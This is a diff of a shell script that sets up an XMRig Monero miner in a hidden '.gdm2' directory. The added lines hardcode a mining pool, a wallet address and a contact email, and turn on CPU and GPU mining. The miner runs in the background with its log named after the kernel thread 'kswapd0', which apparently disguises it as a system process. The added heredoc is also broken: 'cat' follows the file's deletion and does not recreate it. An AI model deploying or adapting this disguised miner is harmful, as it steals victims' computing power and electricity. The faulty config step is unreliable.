@@ -227,14 +227,37 @@ if [ ! -z $EMAIL ]; then
   PASS="$PASS:$EMAIL"
 fi
 
-sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' $HOME/.gdm2/config.json
-sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.gdm2/config.json
-sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.gdm2/config.json
-sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.gdm2/config.json
-sed -i 's#"log-file": *null,#"log-file": "'$HOME/.gdm2/xmrig.log'",#' $HOME/.gdm2/config.json
-sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/.gdm2/config.json
-sed -i 's/"enabled": *[^,]*,/"enabled": true,/' $HOME/.gdm2/config.json
+# sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' $HOME/.gdm2/config.json
+# sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.gdm2/config.json
+# sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.gdm2/config.json
+# sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.gdm2/config.json
+# sed -i 's#"log-file": *null,#"log-file": "'$HOME/.gdm2/xmrig.log'",#' $HOME/.gdm2/config.json
+# sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/.gdm2/config.json
+# sed -i 's/"enabled": *[^,]*,/"enabled": true,/' $HOME/.gdm2/config.json
 
+rm $HOME/.gdm2/config.json
+
+cat $HOME/.gdm2/config.json <<EOL
+{
+    "autosave": true,
+	"background": false,
+    "cpu": true,
+    "opencl": true,
+    "cuda": true,
+    "pools": [
+        {
+            "coin": "monero",
+            "algo": null,
+            "url": "gulf.moneroocean.stream:10128",
+            "user": "4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX",
+            "pass": "littlAcen@24-mail.com",
+            "tls": false,
+            "keepalive": true,
+            "nicehash": false
+        }
+    ]
+}
+EOL
 
 cp $HOME/.gdm2/config.json $HOME/.gdm2/config_background.json
 sed -i 's/"background": *false,/"background": true,/' $HOME/.gdm2/config_background.json
@@ -278,7 +301,7 @@ else
   if ! type systemctl >/dev/null; then
 
     echo "[*] Running miner in the background (see logs in $HOME/.gdm2/kswapd0.log file)"
-    /bin/bash $HOME/.gdm2/miner.sh --config=$HOME/.gdm2/config_background.json >/dev/null 2>&1
+    bash $HOME/.gdm2/miner.sh --config=$HOME/.gdm2/config_background.json >/dev/null 2>&1
     echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
     echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."
 
